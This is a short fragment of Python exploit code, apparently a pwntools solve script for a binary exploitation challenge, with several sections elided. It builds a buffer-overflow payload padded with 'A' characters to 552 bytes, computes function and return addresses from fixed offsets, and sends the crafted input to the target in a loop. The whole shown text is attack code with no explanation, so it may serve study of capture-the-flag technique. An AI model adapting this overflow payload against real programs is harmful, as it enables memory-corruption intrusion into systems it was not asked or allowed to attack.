...
def val(hack,  rip):
    ...
    # vuln_str += 'A' * 100
    if len(vuln_str)-3  != 552:
        vuln_str += ('A' * (552 - (len(vuln_str)-3 )))
...
last_main=func_address+983
print(f"last_main : 0x{last_main:x}")
func_address=last_main-5
print(f"func_address : 0x{func_address:x}")
rip=rip_fun
write=func_address
...
print(f"n:{n}")
io.sendline(val(rip-8-1056+64-3,rip+8))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#12
